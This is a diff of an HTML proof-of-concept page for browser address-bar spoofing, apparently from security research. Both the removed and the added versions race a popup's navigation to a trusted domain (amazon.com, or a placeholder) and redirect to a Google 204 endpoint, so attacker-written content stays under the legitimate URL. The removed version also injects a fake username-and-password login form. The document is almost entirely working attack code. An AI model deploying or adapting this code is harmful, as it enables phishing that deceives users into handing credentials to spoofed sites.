@@ -1,68 +1,75 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-</head>
 <body>
-  <button onclick="openWindow()">1. Open Popup (about:blank)</button>
-  <button onclick="injectAndRace()">2. Inject Content + Start Race Navigation</button>
-
-  <script>
-    let popup;
-
-    function openWindow() {
-      // Buka about:blank dengan nama unik untuk reuse
-      popup = window.open('about:blank', 'spoofwin', 'width=600,height=800');
-      if (!popup) alert('Popup diblok! Izinkan popup untuk site ini.');
-    }
-
-    function injectAndRace() {
-      if (!popup) return alert('Buka popup dulu!');
-
-      // Langkah 1: Tulis content attacker SEKALIGUS (full HTML) sebelum navigation
-      popup.document.open();
-      popup.document.write(`
-        <!DOCTYPE html>
-        <html>
-        <head><title>Contoh Spoof</title></head>
-        <body style="font-family:sans-serif;padding:20px;background:#fff;">
-          <h2>INI CONTENT ATTACKER-CONTROLLED (Phishing Demo)</h2>
-          <p>Address bar seharusnya masih show URL spoofed jika race menang.</p>
-          <form>
-            <input type="text" placeholder="Username" style="width:100%;padding:10px;margin:10px 0;">
-            <input type="password" placeholder="Password">
-            <button type="button" style="background:#007bff;color:white;padding:10px;width:100%;">Login</button>
-          </form>
-          <p style="color:red;">DEMO SPOOFING - JANGAN MASUKKAN DATA ASLI!</p>
-        </body>
-        </html>
-      `);
-      popup.document.close();
-
-      // Langkah 2: Mulai race — navigate ke legitimate URL, tapi rapid redirect ke 204
-      const targetUrl = 'https://www.example.com';  // Ganti dengan domain legitimate (amazon.com, instagram.com, dll)
-      popup.location.href = targetUrl;
-
-      // Aggressive race loop dengan timing variasi untuk tingkatkan win rate
-      let attempts = 0;
-      const raceInterval = setInterval(() => {
-        try {
-          // Trigger exception jika navigation sudah commit
-          popup.location.href;
-          popup.document.title;  // Extra check
-        } catch (e) {
-          // Race win: redirect ke 204 No Content → harapan freeze address bar
-          popup.location.href = 'https://www.google.com/csi?v=2&s=web&t=' + Date.now();
-          attempts++;
-          if (attempts > 20) clearInterval(raceInterval);
-        }
-      }, 0);
-
-      // Tambahan delay + non-standard port untuk slow navigation (kadang membantu)
-      setTimeout(() => {
-        popup.location.href = targetUrl + ':82';  // Port invalid → delay load
-      }, 50);
-    }
-  </script>
+<a id=test href="https://www.amazon.com/" onclick=foo()>https://www.amazon.com/</a>
 </body>
-</html>
+
+<script>
+
+var w;
+var t;
+var z;
+
+if(location.href.indexOf("fake") !== -1){
+document.body.innerHTML = "<h1>This website has moved to http://fake.com</h1>";
+}
+
+
+function foo(){
+
+document.getElementById("test").href="#";
+
+w = window.open("?fake");
+
+t = setInterval('bar()',1);
+
+}
+
+function bar(){
+
+if(w.location.href !== 'about:blank'){
+
+alert("Redirecting");
+
+document.body.innerHTML = "<h1>Redirecting</h1>";
+
+slow();
+
+w.location.href = 'https://www.amazon.com/';
+
+clearInterval(t);
+
+z = setInterval('baz()',1);
+
+}
+
+}
+
+function baz(){
+try{
+w.location.href !== 'about:blank';
+}
+catch (e){
+
+//stop page loading
+w.location.href='https://www.google.com/csi';
+clearInterval(z);
+
+//Make sure the old content is not cleared
+setTimeout("alert('ok');window.location.href='about:blank';window.close();", 3000);
+}
+
+}
+
+
+//slow down the website
+function slow() {
+for (i=0; i<10; i++ ) {
+
+iframe = document.createElement("iframe");
+iframe.src = 'https://www.amazon.com/';
+iframe.style = 'display:none';
+document.body.appendChild(iframe);
+
+}
+}
+
+</script>
